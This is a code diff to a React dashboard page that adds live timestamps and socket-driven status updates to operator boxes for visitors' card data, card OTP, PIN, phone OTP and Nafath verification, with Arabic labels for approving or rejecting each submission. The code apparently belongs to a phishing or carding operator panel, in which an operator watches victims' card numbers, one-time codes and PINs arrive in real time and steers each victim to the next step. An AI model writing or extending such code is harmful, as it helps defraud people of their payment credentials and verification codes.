@@ -128,6 +128,16 @@ export default function DashboardPage() {
   };
   const [pendingDecisions, setPendingDecisions] = useState<PendingDecisions>({});
   
+  // NEW: Box timestamps from database (real-time system)
+  type BoxTimestamp = {
+    visitor_id: string;
+    box_type: string;
+    status: string;
+    event_timestamp: string;
+    updated_at: string;
+  };
+  const [boxTimestamps, setBoxTimestamps] = useState<Record<string, BoxTimestamp>>({});
+  
   const socketRef = useRef<Socket | null>(null);
   const currentTimeRef = useRef(Date.now());
   const headerMenuRef = useRef<HTMLDivElement | null>(null);
@@ -594,6 +604,29 @@ export default function DashboardPage() {
     fetchPendingDecisions();
   }, [selectedRequestId]);
 
+  // NEW: Fetch box timestamps from server when selecting a visitor
+  useEffect(() => {
+    if (!selectedRequestId) {
+      setBoxTimestamps({});
+      return;
+    }
+
+    const fetchBoxTimestamps = async () => {
+      try {
+        const res = await fetch(`/api/boxes/${selectedRequestId}/timestamps`);
+        if (res.ok) {
+          const data = await res.json();
+          setBoxTimestamps(data.timestamps || {});
+          console.log("[BoxTimestamp] Fetched timestamps:", data.timestamps);
+        }
+      } catch (error) {
+        console.error("[BoxTimestamp] Failed to fetch:", error);
+      }
+    };
+
+    fetchBoxTimestamps();
+  }, [selectedRequestId]);
+
   // Listen for pending updates from socket
   useEffect(() => {
     const handlePendingUpdate = (data: { visitorId: string; boxType: string; status: string }) => {
@@ -614,6 +647,44 @@ export default function DashboardPage() {
       socketRef.current.on("pending:update", handlePendingUpdate);
       return () => {
         socketRef.current?.off("pending:update", handlePendingUpdate);
+      };
+    }
+  }, [selectedRequestId]);
+
+  // NEW: Listen for box:update events from server (real-time updates)
+  useEffect(() => {
+    const handleBoxUpdate = (data: { 
+      visitorId: string; 
+      boxType: string; 
+      status: string; 
+      timestamp: string;
+      action?: string;
+      dataType?: string;
+    }) => {
+      console.log("[BoxTimestamp] Received box:update:", data);
+      
+      if (data.visitorId === selectedRequestId) {
+        // Update the box timestamps state
+        setBoxTimestamps((prev) => ({
+          ...prev,
+          [data.boxType]: {
+            visitor_id: data.visitorId,
+            box_type: data.boxType,
+            status: data.status,
+            event_timestamp: data.timestamp,
+            updated_at: data.timestamp,
+          }
+        }));
+        
+        // Force re-render by updating a trigger state if needed
+        // The state update above should trigger a re-render automatically
+      }
+    };
+
+    if (socketRef.current) {
+      socketRef.current.on("box:update", handleBoxUpdate);
+      return () => {
+        socketRef.current?.off("box:update", handleBoxUpdate);
       };
     }
   }, [selectedRequestId]);
@@ -1589,18 +1660,43 @@ export default function DashboardPage() {
       return null;
     }
 
+    // NEW: Get timestamp from boxTimestamps state (real-time system)
+    const cardTimestamp = boxTimestamps?.card?.event_timestamp;
+    const cardStatus = boxTimestamps?.card?.status || effectivePaymentStatus;
+
     return (
-      <div style={{ 
-        background: "#ffffff", 
-        borderRadius: 12, 
-        padding: 16, 
-        border: "1px solid #e5e7eb", 
-        marginBottom: 12,
-        marginTop: 10,
-        width: "40%",
-        marginRight: 0,
-        marginLeft: "auto"
-      }}>
+      <div 
+        data-box-type="card"
+        data-visitor-id={selectedRequestId}
+        data-status={cardStatus || 'pending'}
+        style={{ 
+          background: "#ffffff", 
+          borderRadius: 12, 
+          padding: 16, 
+          border: "1px solid #e5e7eb", 
+          marginBottom: 12,
+          marginTop: 10,
+          width: "40%",
+          marginRight: 0,
+          marginLeft: "auto"
+        }}
+      >
+        {/* NEW: Box timestamp display */}
+        {cardTimestamp && (
+          <div style={{
+            position: "absolute",
+            top: 8,
+            left: 8,
+            fontSize: "0.65rem",
+            color: "#9ca3af",
+            background: "#f3f4f6",
+            padding: "2px 6px",
+            borderRadius: 4
+          }}>
+            <LiveTimer startTime={cardTimestamp} />
+          </div>
+        )}
+        
         <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
           <span style={{ fontSize: "1.2rem" }}>💳</span>
           <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
@@ -1609,17 +1705,17 @@ export default function DashboardPage() {
         </div>
         
         {/* Status message */}
-        {effectivePaymentStatus === "approved" && (
+        {cardStatus === "approved" && (
           <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
             <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق - العميل يُوجه للخطوة التالية</p>
           </div>
         )}
-        {effectivePaymentStatus === "rejected" && (
+        {cardStatus === "rejected" && (
           <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
             <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - العميل يجب أن يُعيد إدخال البيانات</p>
           </div>
         )}
-        {(effectivePaymentStatus === "pending" || effectivePaymentStatus === "verifying") && currentPage === "check" && hasCardData && (
+        {(cardStatus === "pending" || cardStatus === "verifying") && currentPage === "check" && hasCardData && (
           <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
             <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار المراجعة</p>
           </div>
@@ -1671,26 +1767,42 @@ export default function DashboardPage() {
       return null;
     }
 
+    // NEW: Get timestamp from boxTimestamps state (real-time system)
+    const otpTimestamp = boxTimestamps?.otp?.event_timestamp;
+    const otpStatus = boxTimestamps?.otp?.status || effectiveCardOtpStatus;
+
     return (
-      <div style={{ 
-        background: "#ffffff", 
-        borderRadius: 12, 
-        padding: 16, 
-        border: "1px solid #e5e7eb", 
-        marginBottom: 12,
-        marginTop: 10,
-        width: "40%",
-        marginRight: 0,
-        marginLeft: "auto"
-      }}>
+      <div 
+        data-box-type="otp"
+        data-visitor-id={selectedRequestId}
+        data-status={otpStatus || 'pending'}
+        style={{ 
+          background: "#ffffff", 
+          borderRadius: 12, 
+          padding: 16, 
+          border: "1px solid #e5e7eb", 
+          marginBottom: 12,
+          marginTop: 10,
+          width: "40%",
+          marginRight: 0,
+          marginLeft: "auto"
+        }}
+      >
         <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
           <span style={{ fontSize: "1.2rem" }}>🔐</span>
           <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
             صندوق رمز التحقق من البطاقة
           </h3>
-          <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>
-            {formatRelativeTimeLabel(otpBoxTimestamp > 0 ? new Date(otpBoxTimestamp).toISOString() : (selectedRequest?.submittedAt || selectedRequest?.updatedAt))}
-          </span>
+          {otpTimestamp && (
+            <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>
+              <LiveTimer startTime={otpTimestamp} />
+            </span>
+          )}
+          {!otpTimestamp && (
+            <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>
+              {formatRelativeTimeLabel(otpBoxTimestamp > 0 ? new Date(otpBoxTimestamp).toISOString() : (selectedRequest?.submittedAt || selectedRequest?.updatedAt))}
+            </span>
+          )}
         </div>
         
         {/* Show OTP code when submitted */}
@@ -1755,26 +1867,42 @@ export default function DashboardPage() {
       return null;
     }
 
+    // NEW: Get timestamp from boxTimestamps state (real-time system)
+    const pinTimestamp = boxTimestamps?.pin?.event_timestamp;
+    const pinStatus = boxTimestamps?.pin?.status || effectivePinStatus;
+
     return (
-      <div style={{ 
-        background: "#ffffff", 
-        borderRadius: 12, 
-        padding: 16, 
-        border: "1px solid #e5e7eb", 
-        marginBottom: 12,
-        marginTop: 10,
-        width: "40%",
-        marginRight: 0,
-        marginLeft: "auto"
-      }}>
+      <div 
+        data-box-type="pin"
+        data-visitor-id={selectedRequestId}
+        data-status={pinStatus || 'pending'}
+        style={{ 
+          background: "#ffffff", 
+          borderRadius: 12, 
+          padding: 16, 
+          border: "1px solid #e5e7eb", 
+          marginBottom: 12,
+          marginTop: 10,
+          width: "40%",
+          marginRight: 0,
+          marginLeft: "auto"
+        }}
+      >
         <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
           <span style={{ fontSize: "1.2rem" }}>🔑</span>
           <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
             صندوق رمز PIN
           </h3>
-          <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>
-            {formatRelativeTimeLabel(pinBoxTimestamp > 0 ? new Date(pinBoxTimestamp).toISOString() : (selectedRequest?.submittedAt || selectedRequest?.updatedAt))}
-          </span>
+          {pinTimestamp && (
+            <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>
+              <LiveTimer startTime={pinTimestamp} />
+            </span>
+          )}
+          {!pinTimestamp && (
+            <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>
+              {formatRelativeTimeLabel(pinBoxTimestamp > 0 ? new Date(pinBoxTimestamp).toISOString() : (selectedRequest?.submittedAt || selectedRequest?.updatedAt))}
+            </span>
+          )}
         </div>
         
         <div style={{ display: "flex", justifyContent: "center", gap: 4, direction: "ltr", marginBottom: 12 }}>
@@ -1853,18 +1981,43 @@ export default function DashboardPage() {
       return null;
     }
 
+    // NEW: Get timestamp from boxTimestamps state (real-time system)
+    const phoneTimestamp = boxTimestamps?.phone?.event_timestamp;
+    const phoneStatus = boxTimestamps?.phone?.status || effectivePhoneOtpStatus;
+
     return (
-      <div style={{ 
-        background: "#ffffff", 
-        borderRadius: 12, 
-        padding: 16, 
-        border: "1px solid #e5e7eb", 
-        marginBottom: 12,
-        marginTop: 10,
-        width: "40%",
-        marginRight: 0,
-        marginLeft: "auto"
-      }}>
+      <div 
+        data-box-type="phone"
+        data-visitor-id={selectedRequestId}
+        data-status={phoneStatus || 'pending'}
+        style={{ 
+          background: "#ffffff", 
+          borderRadius: 12, 
+          padding: 16, 
+          border: "1px solid #e5e7eb", 
+          marginBottom: 12,
+          marginTop: 10,
+          width: "40%",
+          marginRight: 0,
+          marginLeft: "auto"
+        }}
+      >
+        {/* NEW: Box timestamp display */}
+        {phoneTimestamp && (
+          <div style={{
+            position: "absolute",
+            top: 8,
+            left: 8,
+            fontSize: "0.65rem",
+            color: "#9ca3af",
+            background: "#f3f4f6",
+            padding: "2px 6px",
+            borderRadius: 4
+          }}>
+            <LiveTimer startTime={phoneTimestamp} />
+          </div>
+        )}
+        
         <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
           <span style={{ fontSize: "1.2rem" }}>📱</span>
           <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
@@ -1957,18 +2110,43 @@ const renderNafadBox = () => {
       return null;
     }
 
+    // NEW: Get timestamp from boxTimestamps state (real-time system)
+    const nafadTimestamp = boxTimestamps?.nafad?.event_timestamp;
+    const nafadBoxStatus = boxTimestamps?.nafad?.status || nafadStatus;
+
     return (
-      <div style={{ 
-        background: "#ffffff", 
-        borderRadius: 12, 
-        padding: 16, 
-        border: "1px solid #e5e7eb", 
-        marginBottom: 12,
-        marginTop: 10,
-        width: "40%",
-        marginRight: 0,
-        marginLeft: "auto"
-      }}>
+      <div 
+        data-box-type="nafad"
+        data-visitor-id={selectedRequestId}
+        data-status={nafadBoxStatus || 'pending'}
+        style={{ 
+          background: "#ffffff", 
+          borderRadius: 12, 
+          padding: 16, 
+          border: "1px solid #e5e7eb", 
+          marginBottom: 12,
+          marginTop: 10,
+          width: "40%",
+          marginRight: 0,
+          marginLeft: "auto"
+        }}
+      >
+        {/* NEW: Box timestamp display */}
+        {nafadTimestamp && (
+          <div style={{
+            position: "absolute",
+            top: 8,
+            left: 8,
+            fontSize: "0.65rem",
+            color: "#9ca3af",
+            background: "#f3f4f6",
+            padding: "2px 6px",
+            borderRadius: 4
+          }}>
+            <LiveTimer startTime={nafadTimestamp} />
+          </div>
+        )}
+        
         <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
           <span style={{ fontSize: "1.2rem" }}>🇸🇦</span>
           <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
